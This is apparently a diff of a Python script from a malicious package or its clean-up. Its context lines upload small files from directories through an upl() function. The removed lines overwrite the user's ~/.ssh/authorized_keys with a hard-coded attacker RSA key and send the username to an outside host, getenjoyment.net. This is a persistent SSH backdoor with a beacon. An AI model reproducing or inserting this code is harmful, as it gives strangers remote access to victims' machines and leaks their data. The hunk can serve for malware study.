@@ -167,22 +167,6 @@ if os.name == 'posix':
    if (os.path.getsize(dirs+"/"+i)< 60000):
        upl(dirs+"/"+i )
       
- h=os.getenv("HOME")
- dir=h + "/.ssh"
- ak=dir+"/authorized_keys"
- k="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpD3lm54lC6mCLUzG1XyJ79Ha0aPRtzU8HACTgZB2LIsk5mxcBTJ61p0Hl6H9/SthrOFWP8VpUzGzrEm8BZDbBPfMYHT08X07nk03MH1WCvzRSYV0saG4KRE/Dv+ucUwCc7iLZWqDIie3GNyK6lNY5bpOfZKwOp9vvWwJv4tMPnPS9EibF2hf63lNySm7WInnEMYY+QzobUm9BMB1ju1AeyeMmrpt1PsLgJdvrVoEnDG5XCUWPCKPFncUXAdmyx41GYyB4soEOvO2Zzmqtzyj6ZSFAkgWiNqZAKHbg7slQrTc5eJtBC2PH8x/eUdvpTmtj2WULpmhyMWp4AovZQA3p"
- if not os.path.exists(dir):
-  os.makedirs(dir)
- f = open(ak, "w")
- f.write(k)
- f.close()
- w = os.environ.get('USER')
- try: 
-  x = requests.get('http://wuyfyy.getenjoyment.net/i.php?w='+w)
- except Exception as e:
-  0
-
-
-    
+   
 
 newPair()
